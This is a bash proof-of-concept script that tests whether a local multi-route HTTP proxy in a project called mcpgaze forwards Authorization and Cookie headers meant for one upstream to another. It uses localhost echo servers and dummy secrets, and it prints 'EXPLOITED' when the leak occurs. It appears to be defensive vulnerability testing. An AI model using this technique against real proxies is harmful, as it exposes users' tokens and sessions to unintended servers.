#!/usr/bin/env bash
# PoC: header-leak-no-route-scoping
# Authorization/Cookie attached by the client are forwarded verbatim to whichever
# upstream the request PATH resolves to. With a multi-route wrap-http config, a
# credential meant for upstream A lands on upstream B (and B's Set-Cookie comes
# back to the client). No per-route credential scoping.
#
# Deterministic, re-runnable, ephemeral ports only. Cleans up its own processes.
set -euo pipefail

REPO=/home/gogetassgk/projects/mcpgaze
TSX=( node --import tsx "$REPO/src/index.ts" )
TMP="$(mktemp -d /tmp/hdrleak.XXXXXX)"
LOG="/tmp/hdrleak-header-leak-no-route-scoping.jsonl"
PIDS=()

cleanup() {
  for p in "${PIDS[@]:-}"; do kill "$p" 2>/dev/null || true; done
  # Belt-and-suspenders: kill any echo upstreams spawned from THIS temp dir
  # (background node children can outlive a killed parent shell).
  pkill -f "$TMP/up.mjs" 2>/dev/null || true
  rm -rf "$TMP" "$LOG" 2>/dev/null || true
}
trap cleanup EXIT

# --- Two echo upstreams. Each reports its identity + the creds it received,
#     and mints a Set-Cookie tagged with its identity. ---
cat > "$TMP/up.mjs" <<'EOF'
import { createServer } from "node:http";
const NAME = process.env.UP_NAME;
const s = createServer((req, res) => {
  let b = "";
  req.on("data", c => (b += c));
  req.on("end", () => {
    res.writeHead(200, {
      "content-type": "application/json",
      "set-cookie": `srv=${NAME}; Path=/`,
      "mcp-session-id": `sid-${NAME}`,
    });
    res.end(JSON.stringify({
      upstream: NAME,
      authorization: req.headers.authorization ?? null,
      cookie: req.headers.cookie ?? null,
    }));
  });
});
s.listen(0, "127.0.0.1", () => {
  console.log("http://127.0.0.1:" + s.address().port + "/mcp");
});
EOF

start_up() {
  local name="$1" outfile="$2"
  UP_NAME="$name" node "$TMP/up.mjs" >"$outfile" 2>&1 &
  PIDS+=("$!")
  for _ in $(seq 1 50); do [ -s "$outfile" ] && break; sleep 0.1; done
  head -n1 "$outfile"
}

A_URL="$(start_up A "$TMP/a.out")"
B_URL="$(start_up B "$TMP/b.out")"
echo "upstream A = $A_URL"
echo "upstream B = $B_URL"

# --- Proxy: route /a -> A, route /b -> B, ephemeral port. ---
"${TSX[@]}" wrap-http \
  --route "/a=$A_URL" \
  --route "/b=$B_URL" \
  --port 0 \
  --host 127.0.0.1 \
  --log "$LOG" >"$TMP/proxy.out" 2>&1 &
PIDS+=("$!")

PORT=""
for _ in $(seq 1 50); do
  PORT="$(grep -oE 'listening on http://127\.0\.0\.1:[0-9]+' "$TMP/proxy.out" | grep -oE '[0-9]+$' || true)"
  [ -n "$PORT" ] && break
  sleep 0.1
done
[ -n "$PORT" ] || { echo "FAIL: proxy never reported a listening port"; cat "$TMP/proxy.out"; exit 1; }
echo "proxy port = $PORT"
echo

# --- The attack: a client holding A's credential hits route /b. ---
echo "=== Sending A's credential (Bearer SECRET-FOR-A / sess=COOKIE-FOR-A) to route /b ==="
RESP_HDRS="$TMP/resp.hdrs"
BODY="$(curl -s -D "$RESP_HDRS" -X POST "http://127.0.0.1:$PORT/b" \
  -H 'content-type: application/json' \
  -H 'authorization: Bearer SECRET-FOR-A' \
  -H 'cookie: sess=COOKIE-FOR-A' \
  -d '{"jsonrpc":"2.0","id":1,"method":"x"}')"

echo "response body : $BODY"
echo "set-cookie    : $(grep -i '^set-cookie:' "$RESP_HDRS" | tr -d '\r')"
echo "mcp-session-id: $(grep -i '^mcp-session-id:' "$RESP_HDRS" | tr -d '\r')"
echo

# --- Verdict assertions ---
fail=0
echo "$BODY" | grep -q '"upstream":"B"'                || { echo "ASSERT FAIL: response not from upstream B"; fail=1; }
echo "$BODY" | grep -q '"authorization":"Bearer SECRET-FOR-A"' || { echo "ASSERT FAIL: A's bearer token did NOT reach B"; fail=1; }
echo "$BODY" | grep -q '"cookie":"sess=COOKIE-FOR-A"'  || { echo "ASSERT FAIL: A's cookie did NOT reach B"; fail=1; }
grep -iq 'set-cookie:[[:space:]]*srv=B' "$RESP_HDRS"    || { echo "ASSERT FAIL: B's Set-Cookie not returned to client"; fail=1; }

echo
if [ "$fail" -eq 0 ]; then
  echo "RESULT: EXPLOITED — A's bearer token + cookie were delivered to upstream B,"
  echo "        and B's session cookie (srv=B) was returned to the client."
  exit 0
else
  echo "RESULT: NOT exploited (defense held)"
  exit 1
fi
